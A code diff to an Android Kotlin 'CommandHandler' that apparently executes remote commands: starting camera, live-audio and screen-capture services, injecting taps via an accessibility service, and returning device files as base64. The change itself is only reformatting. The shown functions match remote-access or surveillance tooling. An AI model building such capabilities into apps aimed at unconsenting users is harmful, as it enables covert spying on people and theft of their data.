@@ -106,24 +106,14 @@ object CommandHandler {
     }
 
     private fun stopCameraStream(ctx: Context): JSONObject {
-        try {
-            ctx.stopService(Intent(ctx, CameraStreamService::class.java))
-            return ok()
-        } catch (e: Exception) { return fail(e.message ?: "Error") }
+        try { ctx.stopService(Intent(ctx, CameraStreamService::class.java)); return ok() } catch (e: Exception) { return fail(e.message ?: "Error") }
     }
 
     private fun startAudio(ctx: Context): JSONObject { 
-        try {
-            ContextCompat.startForegroundService(ctx, Intent(ctx, LiveAudioService::class.java))
-            return ok() 
-        } catch (e: Exception) { return fail("Failed to start audio: ${e.message}") }
+        try { ContextCompat.startForegroundService(ctx, Intent(ctx, LiveAudioService::class.java)); return ok() } catch (e: Exception) { return fail("Failed to start audio: ${e.message}") }
     }
-    
     private fun stopAudio(ctx: Context): JSONObject { 
-        try {
-            ctx.startService(Intent(ctx, LiveAudioService::class.java).apply { action = LiveAudioService.ACTION_STOP })
-            return ok() 
-        } catch (e: Exception) { return fail(e.message ?: "Error") }
+        try { ctx.startService(Intent(ctx, LiveAudioService::class.java).apply { action = LiveAudioService.ACTION_STOP }); return ok() } catch (e: Exception) { return fail(e.message ?: "Error") }
     }
 
     private fun startScreen(ctx: Context): JSONObject {
@@ -137,10 +127,7 @@ object CommandHandler {
         } catch (e: Exception) { return fail("Failed to start screen: ${e.message}") }
     }
     private fun stopScreen(ctx: Context): JSONObject { 
-        try {
-            ctx.stopService(Intent(ctx, ScreenCaptureService::class.java))
-            return ok() 
-        } catch (e: Exception) { return fail(e.message ?: "Error") }
+        try { ctx.stopService(Intent(ctx, ScreenCaptureService::class.java)); return ok() } catch (e: Exception) { return fail(e.message ?: "Error") }
     }
 
     private fun tap(x: Float, y: Float): JSONObject = if (TouchService.instance?.tap(x, y) == true) ok() else fail("Accessibility disabled")
@@ -160,7 +147,6 @@ object CommandHandler {
     private fun downloadFile(path: String): JSONObject {
         val f = File(path)
         if (!f.exists() || !f.isFile) return fail("Not a file")
-        // RAISED LIMIT TO 50MB
         if (f.length() > 50L * 1024 * 1024) return fail("File too large > 50MB")
         return ok(JSONObject().put("b64", Base64.encodeToString(f.readBytes(), Base64.NO_WRAP)))
     }
